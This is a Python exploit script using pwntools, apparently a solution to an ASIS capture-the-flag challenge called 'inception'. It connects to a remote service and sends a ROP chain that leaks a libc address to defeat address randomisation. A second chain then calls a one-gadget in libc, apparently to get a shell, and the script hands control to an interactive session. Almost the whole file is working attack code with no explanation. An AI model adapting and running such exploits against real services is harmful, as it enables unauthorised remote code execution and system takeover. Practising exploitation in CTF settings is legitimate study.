from pwn import *
from ctypes import *

address = '37.139.17.37'
port = 1338
binary = './inception'
lib = './libc.so.6'

context.aslr = False
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'

p = remote(address, port)
e = ELF(binary)
l = ELF(lib)

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

rop = ROP(binary)
rop.write(1,0x602028)
rop.read(0,0x602060)
rop.call(0x4008f0)
rop.raw(0x100)
rop.read(0,0x602088)
rop.write(6,0x602088)
rop.raw(0x400c36)

sa("Let's do something: ", "ASIS{N0T_R34LLY_4_FL4G}\x00".ljust(0x28,'\x00') + str(rop))
r(8)
libc_base = u64(r(8)) - l.symbols['puts']
print 'libc base: %x' % libc_base
s(p64(libc_base + 0x1b96))

rop2 = ROP(binary)
one_shot = libc_base + 0x4f2c5
rop2.call(one_shot)

s("TRANSMISSION_OVER\x00ls\x00".ljust(0x28, '\x00') + str(rop2))

p.interactive()